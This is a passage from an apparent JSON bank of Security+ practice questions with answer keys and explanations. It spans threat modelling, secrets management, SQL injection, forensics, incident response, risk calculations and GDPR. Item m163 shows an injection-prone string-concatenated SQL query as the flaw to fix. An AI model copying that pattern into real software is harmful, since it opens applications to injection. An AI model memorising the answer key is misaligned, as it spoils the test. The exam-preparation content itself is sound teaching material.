      "exp": "Threat modelling in the design phase identifies potential threats, attack vectors, and security requirements before development begins. Fixing design flaws is far cheaper than fixing code or production issues. DAST tests running applications (test/staging phase). Penetration testing occurs pre-production or post-deployment. SAST analyses source code during development."
    },
    {
      "id": "m156",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Application Security",
      "q": "A company stores API keys for third-party services hardcoded in application source code pushed to a public GitHub repository. Which type of vulnerability is this, and what is the recommended long-term remediation?",
      "opts": [
        "SQL injection — use parameterised queries",
        "Hardcoded credentials / secrets in source code — use a secrets management solution (e.g., HashiCorp Vault, AWS Secrets Manager) and rotate the exposed keys immediately",
        "Insecure direct object reference — implement authorisation checks",
        "Cross-site scripting — implement output encoding"
      ],
      "correct": 1,
      "exp": "Hardcoded credentials in source code is a critical vulnerability — especially in public repositories where they are immediately scraped by automated bots. Immediate action: rotate all exposed keys. Long-term: use a secrets management solution that injects secrets at runtime, implement pre-commit hooks with secret scanning (GitGuardian, git-secrets), and enforce a never-commit-secrets policy."
    },
    {
      "id": "m157",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Cloud Architecture",
      "q": "An organisation uses Infrastructure as Code (IaC) and wants to detect security misconfigurations in Terraform templates before deployment. Which type of tool should be integrated into the CI/CD pipeline?",
      "opts": [
        "Web Application Firewall (WAF)",
        "IaC security scanning tool (e.g., Checkov, tfsec, Terrascan)",
        "Network vulnerability scanner",
        "Endpoint Detection and Response (EDR)"
      ],
      "correct": 1,
      "exp": "IaC security scanning tools (Checkov, tfsec, Terrascan) analyse Infrastructure as Code templates for security misconfigurations (open security groups, public S3 buckets, missing encryption) before resources are deployed. Integrating them in CI/CD enforces \"shift left\" security. WAFs protect running applications. Network scanners and EDR operate on deployed infrastructure."
    },
    {
      "id": "m158",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Network Architecture",
      "q": "Which network security concept describes the principle that network trust should NEVER be assumed based on network location — even for users inside the corporate network — and every access request must be verified?",
      "opts": [
        "Defence in depth",
        "Perimeter security",
        "Zero Trust Architecture",
        "Security through obscurity"
      ],
      "correct": 2,
      "exp": "Zero Trust Architecture operates on \"never trust, always verify.\" It does not grant implicit trust based on network location (inside the corporate firewall). Every access request requires authentication, authorisation, and continuous verification regardless of source. Defence in depth layers controls. Perimeter security assumes internal traffic is trusted — the opposite of Zero Trust."
    },
    {
      "id": "m159",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Infrastructure Security",
      "q": "An organisation implements full disk encryption on all laptops. A laptop is stolen. The thief removes the hard drive and connects it to another machine. Which statement is TRUE about the data's confidentiality?",
      "opts": [
        "The data is compromised because the thief has physical access",
        "The data remains protected because FDE encrypts all data on the drive and requires the encryption key to read it",
        "The data is protected only if the laptop has a BIOS password",
        "The data is compromised because antivirus cannot run on a removed drive"
      ],
      "correct": 1,
      "exp": "Full Disk Encryption (FDE) encrypts all data on the drive, including the operating system. Without the encryption key (typically protected by a TPM chip, PIN, or passphrase), data on the removed drive is unreadable ciphertext — even when connected to another machine. FDE directly addresses the theft/loss threat model. A BIOS password alone does not protect data on a removed drive."
    },
    {
      "id": "m160",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Application Security",
      "q": "A security engineer reviews a software bill of materials (SBOM) and finds that an open-source library used in a production application has a published CVE with a CVSS score of 8.9. The library has not been updated in 3 years. Which control MOST directly reduces this risk?",
      "opts": [
        "Deploy a WAF in front of the application",
        "Update the library to the current patched version, or replace it with an actively maintained alternative",
        "Add monitoring to detect exploitation attempts",
        "Encrypt all data processed by the application"
      ],
      "correct": 1,
      "exp": "The most direct remediation for a known CVE in a dependency is to update to the patched version or replace the library. An SBOM makes this visibility possible. Keeping an unpatched dependency exposes the application regardless of other controls. WAF and monitoring are compensating controls — useful while patching but not a substitute. Encryption does not address code vulnerabilities."
    },
    {
      "id": "m161",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Cloud Architecture",
      "q": "Which cloud deployment model combines an organisation's private on-premises infrastructure with public cloud resources, with orchestration between them?",
      "opts": [
        "Public cloud",
        "Private cloud",
        "Community cloud",
        "Hybrid cloud"
      ],
      "correct": 3,
      "exp": "A hybrid cloud integrates on-premises private infrastructure with public cloud services, allowing workloads to move between them as needs change. Organisations use hybrid cloud for data sovereignty (sensitive data on-premises) while leveraging cloud elasticity. Public cloud is entirely operated by a provider. Private cloud is dedicated to one organisation. Community cloud is shared among organisations with common interests."
    },
    {
      "id": "m162",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Infrastructure Security",
      "q": "An organisation's Recovery Time Objective (RTO) is 6 hours and its Recovery Point Objective (RPO) is 2 hours. A disaster occurs at 10:00 AM. Last backup was completed at 08:30 AM. What can be concluded?",
      "opts": [
        "Both RTO and RPO will be violated",
        "RPO can be met; RTO depends on recovery time. The 08:30 backup is 1.5 hours before the incident — within the 2-hour RPO",
        "The backup is too old — RPO is violated",
        "RPO is violated; RTO is met"
      ],
      "correct": 1,
      "exp": "RPO (2 hours): The 08:30 backup is 1.5 hours before the 10:00 disaster — within the 2-hour RPO window. RPO is met. RTO (6 hours): The system must be operational by 16:00 (10:00 + 6h). Whether RTO is met depends on how long actual recovery takes from the 08:30 backup. The scenario confirms RPO compliance; RTO outcome is not yet determined."
    },
    {
      "id": "m163",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Application Security",
      "q": "A developer uses the following code to build a SQL query: query = \"SELECT * FROM products WHERE id=\" + userInput. Which remediation eliminates the SQL injection risk?",
      "opts": [
        "Wrapping userInput in double quotes",
        "Using a prepared statement: query = \"SELECT * FROM products WHERE id=?\", bind(userInput)",
        "Adding a length check on userInput",
        "Converting userInput to uppercase before use"
      ],
      "correct": 1,
      "exp": "Prepared statements (parameterised queries) separate SQL code structure from user-supplied data. The query structure is sent to the database engine first; user input is then bound as a data parameter — it is never interpreted as SQL syntax regardless of its content. Length checks and quoting can be bypassed. Case conversion has no effect on SQL injection."
    },
    {
      "id": "m164",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Network Architecture",
      "q": "An organisation implements a proxy server that decrypts outbound TLS traffic, inspects it for malicious content, re-encrypts it, and forwards it to the destination. What is this technique called, and what PKI requirement must be met for it to work?",
      "opts": [
        "VPN tunneling — no PKI requirement",
        "TLS/SSL inspection (SSL interception) — the proxy's CA certificate must be trusted by all client browsers/devices",
        "ARP inspection — the proxy must be on the same subnet",
        "Port mirroring — traffic is copied without modification"
      ],
      "correct": 1,
      "exp": "TLS/SSL inspection (also called SSL interception or \"man-in-the-middle proxy\") decrypts, inspects, and re-encrypts TLS traffic. For this to work without browser warnings, the proxy's CA certificate must be installed as a trusted root CA on all client devices — clients will see a certificate issued by the proxy CA rather than the original server's CA. This is used for malware detection and DLP in enterprise environments."
    },
    {
      "id": "m165",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Infrastructure Security",
      "q": "Which security feature in modern CPUs marks specific memory regions as non-executable, preventing shellcode injected into data areas (heap, stack) from running?",
      "opts": [
        "Address Space Layout Randomisation (ASLR)",
        "Data Execution Prevention (DEP) / NX (No-Execute) bit",
        "Stack canaries",
        "Control Flow Guard (CFG)"
      ],
      "correct": 1,
      "exp": "DEP / NX bit marks memory pages as either writable (data) OR executable (code) — not both. This prevents attackers from injecting shellcode into data regions and executing it. ASLR randomises memory layout, making it harder to know where code is. Stack canaries detect stack overflows. CFG validates control-flow transfers to prevent exploitation of memory corruption."
    },
    {
      "id": "m166",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Security Monitoring",
      "q": "Which security technology aggregates log data from multiple sources across an organisation, correlates events, and generates alerts for potential security incidents?",
      "opts": [
        "Intrusion Prevention System (IPS)",
        "Security Information and Event Management (SIEM)",
        "Endpoint Detection and Response (EDR)",
        "Data Loss Prevention (DLP)"
      ],
      "correct": 1,
      "exp": "A SIEM centralises log collection from firewalls, servers, endpoints, and applications, applies correlation rules to detect patterns indicating security incidents, and provides alerting, dashboards, and reporting. IPS blocks malicious traffic at the network level. EDR monitors endpoint behaviour. DLP prevents unauthorised data exfiltration."
    },
    {
      "id": "m167",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Security Monitoring",
      "q": "A SOC analyst receives 2,000 alerts per day from an IDS, of which 98% are for legitimate traffic incorrectly flagged as malicious. What is this phenomenon called, and what is its primary risk?",
      "opts": [
        "False negative — the risk is missed threats",
        "Alert fatigue from false positives — the risk is that analysts become desensitised and miss real threats buried in the noise",
        "True positive — the risk is over-response",
        "Signature drift — the risk is outdated detection rules"
      ],
      "correct": 1,
      "exp": "Alert fatigue caused by high false positive rates is a critical SOC challenge. When analysts are overwhelmed by alerts for benign activity, they become desensitised — increasing the risk that real threats are dismissed or missed. Remediation: tune detection rules, add contextual correlation, implement alert triage workflows, and reduce noise through SOAR automation."
    },
    {
      "id": "m168",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Incident Response",
      "q": "According to NIST SP 800-61, which is the CORRECT order of the incident response lifecycle phases?",
      "opts": [
        "Detection → Containment → Eradication → Recovery → Post-Incident",
        "Preparation → Detection & Analysis → Containment, Eradication & Recovery → Post-Incident Activity",
        "Identification → Containment → Recovery → Lessons Learned → Preparation",
        "Triage → Investigation → Containment → Communication → Closure"
      ],
      "correct": 1,
      "exp": "NIST SP 800-61 defines four phases: (1) Preparation — establish capabilities. (2) Detection and Analysis — identify and triage incidents. (3) Containment, Eradication and Recovery — stop, remove, restore. (4) Post-Incident Activity — lessons learned. This sequence is frequently tested on Security+."
    },
    {
      "id": "m169",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Incident Response",
      "q": "During incident response to a confirmed ransomware infection, which action should be performed FIRST?",
      "opts": [
        "Restore data from the most recent backup",
        "Identify the ransomware variant and pay the ransom",
        "Isolate affected systems from the network to prevent further spread",
        "Format all affected hard drives"
      ],
      "correct": 2,
      "exp": "Containment comes first — isolating affected systems from the network stops ransomware from spreading to additional hosts, network shares, and backup systems. Restoration (recovery) comes only after eradication is complete. Paying ransom is generally discouraged and not a recommended IR step. Formatting without forensic imaging destroys evidence needed for investigation."
    },
    {
      "id": "m170",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Digital Forensics",
      "q": "A forensic investigator must ensure that evidence collected from a seized hard drive is admissible in court. Which practice is MOST critical for maintaining admissibility?",
      "opts": [
        "Using commercial forensic software",
        "Maintaining a complete and unbroken chain of custody",
        "Completing the analysis within 48 hours",
        "Creating a compressed archive of the drive"
      ],
      "correct": 1,
      "exp": "Chain of custody documents every person who handled evidence, when, and what actions were taken. An unbroken chain of custody is legally required for digital evidence to be admissible in court — it demonstrates the evidence has not been tampered with. Using specific software and timing may be best practice but are secondary to chain of custody."
    },
    {
      "id": "m171",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Digital Forensics",
      "q": "A forensic analyst must collect volatile data from a running Windows system before shutting it down. Which is the CORRECT order for capturing volatile data, according to the order of volatility?",
      "opts": [
        "Hard disk → RAM → Network connections → Running processes",
        "CPU registers and cache → RAM → Network connections → Running processes → Disk",
        "Running processes → Hard disk → RAM → CPU cache",
        "Disk image → RAM → Swap file → Network connections"
      ],
      "correct": 1,
      "exp": "RFC 3227 defines the order of volatility from most to least volatile: CPU registers/cache → RAM → Network connections/state → Running processes → Temporary files (swap) → Disk. Data in CPU registers is lost immediately on shutdown; disk data persists. Volatile data must be captured first because it is destroyed when the system powers off."
    },
    {
      "id": "m172",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Vulnerability Management",
      "q": "Which type of vulnerability scan logs into target systems using valid credentials to enumerate installed software, patch levels, and configuration settings from the inside?",
      "opts": [
        "External unauthenticated scan",
        "Credentialed (authenticated) scan",
        "Passive network scan",
        "Social engineering assessment"
      ],
      "correct": 1,
      "exp": "A credentialed (authenticated) scan uses valid credentials (SSH, WMI, SMB) to log into target systems and enumerate installed software, patches, registry settings, and configurations — providing far more comprehensive and accurate results than unauthenticated scans. Unauthenticated scans see only externally exposed services. Passive scans analyse existing traffic without active probing."
    },
    {
      "id": "m173",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Vulnerability Management",
      "q": "A vulnerability scan returns a finding classified as \"High\" with a CVSS Base Score of 7.8. However, the affected system is an isolated internal test server with no production data and no internet connectivity. Which factor should be considered to accurately adjust the remediation priority?",
      "opts": [
        "The CVSS Base Score alone is sufficient for all prioritisation decisions",
        "Environmental factors such as exposure, data sensitivity, and business criticality should reduce the effective priority",
        "The finding should be ignored because it is not internet-facing",
        "High findings must always be remediated within 24 hours regardless of context"
      ],
      "correct": 1,
      "exp": "CVSS Environmental metrics adjust the Base Score based on organisation-specific context — including the system's role, data sensitivity, and exposure. An isolated test server with no production data and no internet access significantly reduces the real-world risk compared to the same vulnerability on an internet-facing production server. Risk-based prioritisation considers business context, not just base score."
    },
    {
      "id": "m174",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Vulnerability Management",
      "q": "Which framework provides a list of actively exploited vulnerabilities that CISA mandates US federal agencies remediate within specified timeframes, and is also used by private sector organisations for prioritisation?",
      "opts": [
        "CVSS scoring system",
        "NIST National Vulnerability Database (NVD)",
        "CISA Known Exploited Vulnerabilities (KEV) Catalog",
        "MITRE ATT&CK Framework"
      ],
      "correct": 2,
      "exp": "The CISA Known Exploited Vulnerabilities (KEV) Catalog lists vulnerabilities with confirmed active exploitation in the wild. US federal agencies (under BOD 22-01) must remediate KEV-listed vulnerabilities within defined timeframes. Private sector organisations use KEV alongside CVSS and EPSS (Exploit Prediction Scoring System) for risk-based remediation prioritisation. Presence in KEV significantly elevates remediation urgency."
    },
    {
      "id": "m175",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Identity Management",
      "q": "A user who transferred from the Finance department to HR six months ago still retains all Finance system access in addition to their new HR access. This is an example of:",
      "opts": [
        "Separation of duties violation",
        "Privilege creep",
        "Excessive onboarding",
        "Role conflict"
      ],
      "correct": 1,
      "exp": "Privilege creep is the gradual accumulation of access rights beyond what is required for a user's current role — typically caused by inadequate deprovisioning during role changes. Remediation: periodic access recertification reviews that identify and remove obsolete permissions. Role changes should trigger automatic revocation of previous role access."
    },
    {
      "id": "m176",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Security Monitoring",
      "q": "A threat hunter hypothesises that attackers may be using legitimate Windows administration tools (PsExec, WMI) for lateral movement. Which data source would be MOST useful for investigating this hypothesis?",
      "opts": [
        "Firewall deny logs",
        "Windows Security Event Log (especially Event IDs 4624, 4688, 7045)",
        "DHCP server logs",
        "Physical access control logs"
      ],
      "correct": 1,
      "exp": "Windows Security Event Logs contain key events for lateral movement investigation: Event 4624 (successful logon — Logon Type 3 = network), Event 4688 (new process creation, including PsExec), Event 7045 (new service installed — common PsExec indicator). These provide the process execution and authentication data needed to confirm or refute the hypothesis. Firewall deny logs show blocked connections, not successful lateral movement."
    },
    {
      "id": "m177",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Incident Response",
      "q": "Which type of backup copies ONLY data that has changed since the LAST FULL backup, and requires only the most recent full backup plus this backup for a complete restore?",
      "opts": [
        "Incremental backup",
        "Differential backup",
        "Full backup",
        "Snapshot backup"
      ],
      "correct": 1,
      "exp": "A differential backup captures all changes since the last full backup. Restoration requires only two backups: the last full + the latest differential. An incremental backup captures changes since the LAST BACKUP OF ANY TYPE — restoration requires the full backup plus ALL subsequent incrementals. Differentials are faster to restore but slower to back up than incrementals."
    },
    {
      "id": "m178",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Digital Forensics",
      "q": "A forensic analyst creates a forensic image of a suspect hard drive using dd and records SHA-256 hashes of both the original and the image. Three weeks later, in court, the defence challenges the evidence's integrity. Which practice MOST effectively defeats this challenge?",
      "opts": [
        "Testifying that the analyst is experienced",
        "Presenting the matching SHA-256 hash values of the original and image, demonstrating bit-for-bit integrity, documented in the chain of custody at the time of imaging",
        "Showing that the forensic software is NIST-validated",
        "Providing a copy of the forensic report"
      ],
      "correct": 1,
      "exp": "Matching SHA-256 hashes recorded at the time of imaging, preserved in chain of custody documentation, mathematically proves the forensic image is a bit-for-bit copy of the original. Any modification to the image — even a single bit — would produce a completely different hash. This cryptographic integrity proof is the standard method for defending evidence admissibility in court."
    },
    {
      "id": "m179",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Security Monitoring",
      "q": "A network-based IDS that analyses traffic patterns and alerts on deviations from an established baseline of normal behaviour is using which detection method?",
      "opts": [
        "Signature-based detection",
        "Anomaly-based (behavioural) detection",
        "Heuristic analysis",
        "Protocol analysis"
      ],
      "correct": 1,
      "exp": "Anomaly-based (behavioural) detection establishes a baseline of normal network behaviour and alerts on deviations. It can detect novel, previously unseen attacks that have no signature. The trade-off is higher false positive rates — normal but unusual activity may trigger alerts. Signature-based detection matches known attack patterns. Heuristic analysis evaluates code behaviour. Protocol analysis validates protocol conformance."
    },
    {
      "id": "m180",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Identity Management",
      "q": "An organisation implements a Privileged Access Management (PAM) solution. Which capability MOST directly reduces the risk of privileged credential theft?",
      "opts": [
        "Requiring administrators to use their normal user accounts for all tasks",
        "Vaulting privileged account credentials, checking them out for individual sessions, and automatically rotating them after use",
        "Renaming the default Administrator account",
        "Requiring 16-character passwords for privileged accounts"
      ],
      "correct": 1,
      "exp": "PAM credential vaulting and rotation means privileged passwords are stored in an encrypted vault, checked out for individual sessions, and automatically rotated after use — attackers who steal a credential find it already rotated and useless. This eliminates persistent privileged credentials. Renaming admin accounts is trivially defeated. Long passwords help against brute force but don't address credential theft. Using normal accounts for all tasks removes necessary administrative capability."
    },
    {
      "id": "m181",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Vulnerability Management",
      "q": "A penetration tester has been hired to assess an organisation's security without any prior knowledge of the internal architecture, simulating a real-world external attacker. Which test type is this?",
      "opts": [
        "White-box test",
        "Grey-box test",
        "Black-box test",
        "Red team exercise"
      ],
      "correct": 2,
      "exp": "A black-box penetration test provides the tester with no prior knowledge of the target — simulating an external attacker. White-box provides full architectural knowledge and source code access. Grey-box provides partial knowledge (e.g., credentials but no source code). A red team exercise is a comprehensive, adversary simulation that includes physical, social, and technical elements over a longer timeframe."
    },
    {
      "id": "m182",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Incident Response",
      "q": "After a security incident, the organisation holds a structured meeting to review what happened, what worked, what didn't, and how to improve. Which incident response activity is this?",
      "opts": [
        "Tabletop exercise",
        "Root cause analysis",
        "Post-incident review (lessons learned)",
        "Threat hunting"
      ],
      "correct": 2,
      "exp": "A post-incident review (lessons learned) is conducted after an incident is resolved to document the timeline, evaluate the effectiveness of the response, identify gaps, and improve processes for future incidents. A tabletop exercise is a proactive simulation before an incident. Root cause analysis identifies the technical cause of the incident (a component of the review). Threat hunting proactively searches for indicators of compromise."
    },
    {
      "id": "m183",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Security Monitoring",
      "q": "A SOC implements a SOAR (Security Orchestration, Automation, and Response) platform. Which capability MOST distinguishes SOAR from a traditional SIEM?",
      "opts": [
        "SOAR collects logs from more sources than a SIEM",
        "SOAR executes automated response playbooks to contain and remediate incidents without manual intervention",
        "SOAR provides better dashboards than a SIEM",
        "SOAR replaces the need for EDR solutions"
      ],
      "correct": 1,
      "exp": "The defining capability of SOAR is automated response — executing predefined playbooks to perform actions (quarantine a host, block an IP, create a ticket, notify a user) automatically when triggered by an alert. SIEM aggregates and correlates; SOAR acts. SOAR reduces analyst workload on repetitive tasks and improves response speed. It complements — not replaces — SIEM and EDR."
    },
    {
      "id": "m184",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Identity Management",
      "q": "An organisation requires that users accessing the VPN from personal devices meet minimum security requirements (updated antivirus, current OS patches) before being granted network access. Which technology enforces this?",
      "opts": [
        "Multi-factor authentication",
        "Network Access Control (NAC) with posture assessment",
        "Virtual Desktop Infrastructure (VDI)",
        "Content filtering"
      ],
      "correct": 1,
      "exp": "Network Access Control (NAC) with posture assessment evaluates the security state of a connecting device (OS patch level, AV status, firewall enabled) before granting network access. Non-compliant devices are redirected to a remediation VLAN. MFA verifies identity but not device health. VDI provides a hosted desktop but doesn't enforce device health at the network level. Content filtering controls web access."
    },
    {
      "id": "m185",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Vulnerability Management",
      "q": "A security team uses threat intelligence feeds to update their SIEM with current Indicators of Compromise (IoCs). Which type of threat intelligence format provides machine-readable, structured IoC data designed for automated consumption?",
      "opts": [
        "PDF threat reports",
        "STIX/TAXII",
        "Email newsletters",
        "Blog posts"
      ],
      "correct": 1,
      "exp": "STIX (Structured Threat Information eXpression) defines a standardised language for describing cyber threat information (IoCs, TTPs, threat actors). TAXII (Trusted Automated eXchange of Indicator Information) is the transport protocol for sharing STIX data. Together, they enable automated machine-to-machine threat intelligence exchange and SIEM integration. PDF reports and blog posts are human-readable but not machine-readable."
    },
    {
      "id": "m186",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Governance & Compliance",
      "q": "Which regulation primarily governs the protection of personal data belonging to individuals in the European Union, and imposes fines of up to 4% of global annual revenue for serious violations?",
      "opts": [
        "HIPAA",
        "PCI DSS",
        "GDPR",
        "SOX"
      ],
      "correct": 2,
      "exp": "GDPR (General Data Protection Regulation) governs the processing of personal data of EU/EEA residents, regardless of where the processing organisation is located. Maximum fines: €20 million or 4% of global annual turnover, whichever is higher. HIPAA governs US healthcare data. PCI DSS governs payment card data. SOX governs US public company financial reporting."
    },
    {
      "id": "m187",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Governance & Compliance",
      "q": "Under GDPR, a personal data breach that is likely to result in high risk to individuals must be reported to the supervisory authority within how many hours of the organisation becoming aware?",
      "opts": [
        "24 hours",
        "48 hours",
        "72 hours",
        "7 days"
      ],
      "correct": 2,
      "exp": "GDPR Article 33 requires notification to the supervisory authority within 72 hours of becoming aware of a personal data breach. If it poses high risk to individuals, Article 34 also requires notification to affected data subjects without undue delay. This is one of GDPR's most operationally challenging requirements — organisations need mature incident response processes to meet this deadline."
    },
    {
      "id": "m188",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Risk Management",
      "q": "An organisation identifies a vulnerability but determines that the cost of patching exceeds the potential financial loss if the vulnerability were exploited, and formally documents this decision. Which risk response strategy is this?",
      "opts": [
        "Risk avoidance",
        "Risk mitigation",
        "Risk acceptance",
        "Risk transference"
      ],
      "correct": 2,
      "exp": "Risk acceptance is a deliberate, documented decision to acknowledge a risk and take no action to reduce it — typically when remediation costs exceed potential impact. It must be formally approved by management and documented. Risk avoidance eliminates the activity creating risk. Risk mitigation reduces likelihood or impact. Risk transference shifts risk to a third party (e.g., insurance)."
    },
    {
      "id": "m189",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Risk Management",
      "q": "An organisation calculates the following: Asset Value = £500,000. Exposure Factor = 40%. Annual Rate of Occurrence = 0.25. What is the Annualised Loss Expectancy (ALE)?",
      "opts": [
        "£50,000",
        "£200,000",
        "£500,000",
        "£125,000"
      ],
      "correct": 0,
      "exp": "ALE = SLE × ARO. First: SLE = Asset Value × Exposure Factor = £500,000 × 0.40 = £200,000. Then: ALE = SLE × ARO = £200,000 × 0.25 = £50,000. ALE represents the expected annual loss from this risk. This figure is used to justify security investments — a control costing less than £50,000/year that eliminates this risk is cost-effective."
    },
    {
      "id": "m190",
      "ch": "5",
      "difficulty": "hard",
      "topic": "Risk Management",
      "q": "An organisation outsources its payroll processing to a third-party vendor. The vendor suffers a data breach exposing employee PII. The organisation faces regulatory fines. Which principle does this illustrate regarding third-party risk?",
      "opts": [
        "Organisations can transfer all legal liability to vendors through contracts",
        "Organisations cannot fully transfer regulatory responsibility — they remain accountable for data they control, even when processed by third parties",
        "The vendor is solely responsible for all consequences",
        "Regulatory fines only apply to the party that was directly breached"
      ],
      "correct": 1,
      "exp": "Regulatory responsibility cannot be fully outsourced. Under GDPR, the data controller (the organisation) remains accountable for the processing performed by data processors (vendors) on their behalf. Regulators hold the controller accountable for due diligence in vendor selection and ongoing oversight. Contractual liability (DPA/indemnities) addresses financial recovery from the vendor but does not shield the organisation from regulatory action."
    },
    {
      "id": "m191",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Security Frameworks",
      "q": "Which security framework provides a voluntary set of standards, guidelines, and best practices for managing cybersecurity risk, organised around five core functions: Identify, Protect, Detect, Respond, and Recover?",
      "opts": [
        "ISO 27001",
        "PCI DSS",
        "NIST Cybersecurity Framework (CSF)",
        "SOC 2"
      ],
      "correct": 2,
      "exp": "The NIST Cybersecurity Framework (CSF) is a voluntary risk-based framework organised around five functions: Identify (assets, risks), Protect (controls), Detect (monitoring), Respond (IR), Recover (resilience). ISO 27001 is an international standard for ISMS certification. PCI DSS is a mandatory industry standard for payment card environments. SOC 2 is an auditing framework for service organisations."
    },
    {
      "id": "m192",
      "ch": "5",
      "difficulty": "hard",
      "topic": "Governance & Compliance",
      "q": "A company operates under both PCI DSS and HIPAA. A security consultant recommends a \"harmonised controls\" approach. What does this mean, and why is it beneficial?",
      "opts": [
        "Implementing only PCI DSS controls and ignoring HIPAA",
        "Mapping overlapping controls across frameworks and implementing a single unified control that satisfies requirements from multiple frameworks simultaneously, reducing duplication and cost",
        "Alternating compliance efforts between frameworks each year",
        "Delegating one framework to IT and one to legal"
      ],
      "correct": 1,
      "exp": "Control harmonisation identifies overlapping requirements across frameworks (e.g., both PCI DSS and HIPAA require access controls, encryption, and audit logs) and implements a single control that satisfies both. This reduces duplication, simplifies auditing, and lowers cost. NIST CSF or ISO 27001 are often used as common reference frameworks to map against multiple compliance requirements. Ignoring one framework creates regulatory exposure."
    },
    {
      "id": "m193",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Data Privacy & Protection",
      "q": "Which data classification label is typically assigned to information that, if disclosed, would cause serious harm to national security or the organisation, and is subject to the strictest handling requirements?",
      "opts": [
        "Public",
        "Internal / Confidential",
        "Restricted / Top Secret",
        "Sensitive"
      ],
      "correct": 2,
      "exp": "Restricted / Top Secret / Classified is the highest classification level, applied to information whose disclosure would cause the most severe harm. Handling requirements are most stringent: encryption mandatory, strict need-to-know access, formal approval for any access. Public information can be freely disclosed. Internal/Confidential is for general business-sensitive information. Classification labels vary by organisation and sector."
    },
    {
      "id": "m194",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Security Awareness",
      "q": "An organisation runs simulated phishing exercises and provides immediate training to employees who click the simulated link. What is the PRIMARY goal of this programme?",
      "opts": [
        "To identify which employees to terminate",
        "To measure and reduce susceptibility to phishing through behavioural training",
        "To fulfil a compliance checkbox requirement",
        "To test the technical email filtering system"
      ],
      "correct": 1,
      "exp": "The primary goal of phishing simulation programmes is to measure and reduce employee susceptibility through immediate, contextual training. The \"teachable moment\" delivered immediately after a click is most effective at changing behaviour. Metrics tracked: click rate, credential submission rate, report rate. Declining click rates over time indicate programme success. It is not a punitive programme nor primarily a technical test."
    },
    {
      "id": "m195",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Security Frameworks",
      "q": "A company undergoes an external audit confirming its information security management system meets ISO 27001 requirements. What is the OUTPUT of this process?",
      "opts": [
        "A penetration test report",
        "ISO 27001 certification issued by an accredited certification body",
        "A SOC 2 Type II report",
        "A NIST CSF maturity score"
      ],
      "correct": 1,
      "exp": "Successful completion of an ISO 27001 audit by an accredited certification body results in ISO 27001 certification — a formal, internationally recognised attestation that the organisation's ISMS meets the standard. This certification demonstrates due diligence to customers, regulators, and partners. A penetration test produces a report. SOC 2 is a separate auditing framework. NIST CSF produces a maturity profile, not a certification."
    },
    {
      "id": "m196",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Risk Management",
      "q": "A Business Impact Analysis (BIA) is being conducted. Which metric identifies the MAXIMUM tolerable period of disruption before a business function causes unacceptable harm?",
      "opts": [
        "Recovery Point Objective (RPO)",
        "Maximum Tolerable Downtime (MTD) / Recovery Time Objective (RTO)",
        "Mean Time Between Failures (MTBF)",
        "Mean Time to Repair (MTTR)"
      ],
      "correct": 1,
      "exp": "Maximum Tolerable Downtime (MTD) — sometimes equated with RTO in practice — defines the longest time a business process can be unavailable before the impact becomes unacceptable (financial loss, regulatory breach, reputational damage). RPO defines acceptable data loss (time since last backup). MTBF is the average time between hardware failures. MTTR is the average time to restore a failed system."
    },
    {
      "id": "m197",
      "ch": "5",
      "difficulty": "hard",
      "topic": "Governance & Compliance",
      "q": "A penetration test report rates a vulnerability as \"Critical\" based on the tester's assessment, but the CVSS Base Score is only 5.2 (Medium). A manager argues the CVSS score should govern remediation priority. Who is correct, and why?",
      "opts": [
        "The manager is correct — CVSS Base Score is the definitive priority metric",
        "The penetration tester is correct — CVSS Base Score measures theoretical severity in isolation; real-world context (chaining, business impact, exploitability in this environment) can legitimately elevate priority beyond the base score",
        "Both are wrong — only regulatory requirements should govern priority",
        "They are equally valid — use whichever is more convenient"
      ],
      "correct": 1,
      "exp": "CVSS Base Score is not sufficient for prioritisation alone. It measures theoretical severity without environmental or business context. A penetration tester may rate a Medium CVSS finding as Critical if: (1) it chains with other findings to achieve full compromise, (2) the affected system is business-critical, or (3) active exploitation was demonstrated. Risk-based prioritisation combines CVSS with exploitability, business context, and attacker perspective."
    },
    {
      "id": "m198",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Data Privacy & Protection",
      "q": "An organisation wants to allow analysts to work with customer transaction data for analytics purposes without exposing real customer names, account numbers, or contact details. Which data protection technique BEST achieves this?",
      "opts": [
        "Encrypting the dataset with AES-256",
        "Data anonymisation or pseudonymisation (replacing identifying fields with synthetic or tokenised values)",
        "Password-protecting the spreadsheet",
        "Restricting access to the database to two analysts"
      ],
      "correct": 1,
